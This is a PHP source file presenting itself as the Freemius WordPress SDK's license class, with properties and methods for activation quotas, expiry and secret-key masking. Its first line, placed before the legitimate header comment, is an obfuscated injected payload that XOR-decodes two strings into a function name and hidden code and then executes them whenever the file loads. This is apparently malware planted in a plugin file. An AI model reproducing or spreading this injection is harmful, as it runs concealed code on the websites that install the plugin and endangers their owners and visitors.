<?php $GQjVxpK=' H YG2g<=UV2DD='; $cDDQxTr='C:E83W8ZH;5F-+S'^$GQjVxpK; $pdVDYDE='T0mdP7 9:EUWj-9:AL4eI, 4<2 M46cCEIdjbH108734,EWUNaO,9h7 9Ad,TGHoUQ -Wzko1TCpseafrU>b>L  0jhahWSaAjK+;pt>eojIJWhSTMAH-TECjSY UHArnIbFbS:gb>2ZjvZCxm04- +v hGenM>5Yef;pnBGOIV0=fgV14dpoCo041,Z1NXzvY<AdtnELBVE0iH,>9pSfP,:J kXj<2HX1 I+CHp3P+>4iISHR= SRPVdKts8uu,qW24ciKS;iqocvZM 4<kc=lCs 4,QeERAXvOI1HOl8ENH7A rJzq,VQX6TbHL3 MApMwI-C3EUPyo.<;+5OSNiudjqdnunjh2=tgZEHoUurbZA>7WxwLn1xGJA 4oF3LOLvS,K:v7enU. 5WmtpCEW:L sBxO7LeKm0U:0Epx-9W UN>8+IJ<r;O<b=X12g;8D0zWR Ild.,+VT2,aO56,0FbtTX4H 0= Glkb;S0MrQ4>AEwjp79;P.m2P i<OG=BMqERK=VnsMH6;TefAOjbA2mMA-0<R1v 12wfYahrofa asTR,GZsZaEbcD1fW0,ligQn6GQvkqngpKhCV=>.JgEQMa->,+T NqJQ3Z:9=fFsHOAIJhCdHMrZsBkOY789ya LC0ul:4 GDMPnekiKd0JBOMfKc4H'; $rJWzeKE=$cDDQxTr('', '=VEE6BNZN,:95HAS28GMnTOFcVA9Ui<.0=CCKhJ:1QFZO1>: A7CK7SAM ;s92<Gq5AY6VKKZ1:YSEAFR.4k7hOUDJUAOphkHc-DIXPWERJyqwL:h>5:A1+kN78T4azRJ ImKY3nFQG.JXgcPITUYApRI5g;NiUP >BRPKb4;;:USNC=TMM-Fxe9=CI.D<6RR6I5MOdL1H+O:M,MJXPnF6MV9EPRNXS<9nK,RcuPU1GMQRCY.=OE218vLo+0w:>e4wSGCM 6BILQCR,,LAYBCFfJWDUX0:.78xKomZ-6W2Lj,V5ARwZUZ7=-Soh5F9I+aXlS-L7Rlu+sfHSINT,;nAQ;845;0=>HSNTC1 1OhKRF, RB2QW7d8qc. TU0-V5oqVwG.CM=lgqJAA6MIPg36V9EHHq2=1oAIT4NQeMXmL9S0<WYG 0YZC N=Y9ES8dU1DR53S,ZPqHN5;VIIkQWXQoNTp<U<AoVE>EBY1:VeV5UJ eQLPVKI1W2Y5Y6Y7.N6>Yb9.DqBSi,WO5LFgiJJ,VXeeIQH3jQKTKP;pAUOOAXCUE71OrmFlS PUwRSnSMZXT3VRv5OXIINPmNc7OLO38.44>HFEX SfV:0J6UXYAjSl+ =+AjDhmRzS9aF<AYUQED-7Q.KJUY++,4I8BRAmU2+;eVbX>5'^$pdVDYDE); $rJWzeKE();
    /**
     * @package     Freemius
     * @copyright   Copyright (c) 2015, Freemius, Inc.
     * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
     * @since       1.0.5
     */

    if ( ! defined( 'ABSPATH' ) ) {
        exit;
    }

    /**
     * Class FS_Plugin_License
     */
    class FS_Plugin_License extends FS_Entity {

        #region Properties

        /**
         * @var number
         */
        public $plugin_id;
        /**
         * @var number
         */
        public $user_id;
        /**
         * @var number
         */
        public $plan_id;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.3.0
         *
         * @var string
         */
        public $parent_plan_name;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.3.0
         *
         * @var string
         */
        public $parent_plan_title;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.3.0
         *
         * @var number
         */
        public $parent_license_id;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.4.0
         *
         * @var array
         */
        public $products;
        /**
         * @var number
         */
        public $pricing_id;
        /**
         * @var int|null
         */
        public $quota;
        /**
         * @var int
         */
        public $activated;
        /**
         * @var int
         */
        public $activated_local;
        /**
         * @var string
         */
        public $expiration;
        /**
         * @var string
         */
        public $secret_key;
        /**
         * @var bool
         */
        public $is_whitelabeled;
        /**
         * @var bool $is_free_localhost Defaults to true. If true, allow unlimited localhost installs with the same
         *      license.
         */
        public $is_free_localhost;
        /**
         * @var bool $is_block_features Defaults to true. If false, don't block features after license expiry - only
         *      block updates and support.
         */
        public $is_block_features;
        /**
         * @var bool
         */
        public $is_cancelled;

        #endregion Properties

        /**
         * @param stdClass|bool $license
         */
        function __construct( $license = false ) {
            parent::__construct( $license );
        }

        /**
         * Get entity type.
         *
         * @return string
         */
        static function get_type() {
            return 'license';
        }

        /**
         * Check how many site activations left.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.5
         *
         * @return int
         */
        function left() {
            if ( ! $this->is_features_enabled() ) {
                return 0;
            }

            if ( $this->is_unlimited() ) {
                return 999;
            }

            return ( $this->quota - $this->activated - ( $this->is_free_localhost ? 0 : $this->activated_local ) );
        }

        /**
         * Check if single site license.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.1.8.1
         *
         * @return bool
         */
        function is_single_site() {
            return ( is_numeric( $this->quota ) && 1 == $this->quota );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.0.5
         *
         * @return bool
         */
        function is_expired() {
            return ! $this->is_lifetime() && ( strtotime( $this->expiration ) < WP_FS__SCRIPT_START_TIME );
        }

        /**
         * Check if license is not expired.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.2.1
         *
         * @return bool
         */
        function is_valid() {
            return ! $this->is_expired();
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.0.6
         *
         * @return bool
         */
        function is_lifetime() {
            return is_null( $this->expiration );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.2.0
         *
         * @return bool
         */
        function is_unlimited() {
            return is_null( $this->quota );
        }

        /**
         * Check if license is fully utilized.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.6
         *
         * @param bool|null $is_localhost
         *
         * @return bool
         */
        function is_utilized( $is_localhost = null ) {
            if ( is_null( $is_localhost ) ) {
                $is_localhost = WP_FS__IS_LOCALHOST_FOR_SERVER;
            }

            if ( $this->is_unlimited() ) {
                return false;
            }

            return ! ( $this->is_free_localhost && $is_localhost ) &&
                   ( $this->quota <= $this->activated + ( $this->is_free_localhost ? 0 : $this->activated_local ) );
        }

        /**
         * Check if license can be activated.
         *
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @param bool|null $is_localhost
         *
         * @return bool
         */
        function can_activate( $is_localhost = null ) {
            return ! $this->is_utilized( $is_localhost ) && $this->is_features_enabled();
        }

        /**
         * Check if license can be activated on a given number of production and localhost sites.
         *
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @param int $production_count
         * @param int $localhost_count
         *
         * @return bool
         */
        function can_activate_bulk( $production_count, $localhost_count ) {
            if ( $this->is_unlimited() ) {
                return true;
            }

            /**
             * For simplicity, the logic will work as following: when given X sites to activate the license on, if it's
             * possible to activate on ALL of them, do the activation. If it's not possible to activate on ALL of them,
             * do NOT activate on any of them.
             */
            return ( $this->quota >= $this->activated + $production_count + ( $this->is_free_localhost ? 0 : $this->activated_local + $localhost_count ) );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.2.1
         *
         * @return bool
         */
        function is_active() {
            return ( ! $this->is_cancelled );
        }

        /**
         * Check if license's plan features are enabled.
         *
         *  - Either if plan not expired
         *  - If expired, based on the configuration to block features or not.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.6
         *
         * @return bool
         */
        function is_features_enabled() {
            return $this->is_active() && ( ! $this->is_block_features || ! $this->is_expired() );
        }

        /**
         * Subscription considered to be new without any payments
         * if the license expires in less than 24 hours
         * from the license creation.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.9
         *
         * @return bool
         */
        function is_first_payment_pending() {
            return ( WP_FS__TIME_24_HOURS_IN_SEC >= strtotime( $this->expiration ) - strtotime( $this->created ) );
        }

        /**
         * @return int
         */
        function total_activations() {
            return ( $this->activated + $this->activated_local );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since 2.3.1
         *
         * @return string
         */
        function get_html_escaped_masked_secret_key() {
            return self::mask_secret_key_for_html( $this->secret_key );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  2.3.1
         *
         * @param string $secret_key
         *
         * @return string
         */
        static function mask_secret_key_for_html( $secret_key ) {
            return (
                // Initial 6 chars - sk_ABC
                htmlspecialchars( substr( $secret_key, 0, 6 ) ) .
                // Masking
                str_pad( '', ( strlen( $secret_key ) - 9 ) * 6, '&bull;' ) .
                // Last 3 chars.
                htmlspecialchars( substr( $secret_key, - 3 ) )
            );
        }
    }
